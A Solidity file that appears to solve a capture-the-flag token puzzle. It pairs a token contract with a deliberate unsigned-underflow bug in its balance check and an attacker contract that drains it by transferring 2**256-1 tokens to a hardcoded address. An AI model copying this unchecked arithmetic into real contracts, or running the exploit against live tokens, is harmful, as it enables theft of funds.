// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

contract Attacker {
    Token token;

    constructor() public {
        token = Token(0x6549da35ec715dF1669dEe8bF4C6dD806B5E611b);
    }

    function attack() public {
        uint overflow = 2**256 - 1;
        token.transfer(msg.sender, overflow);
    }
}
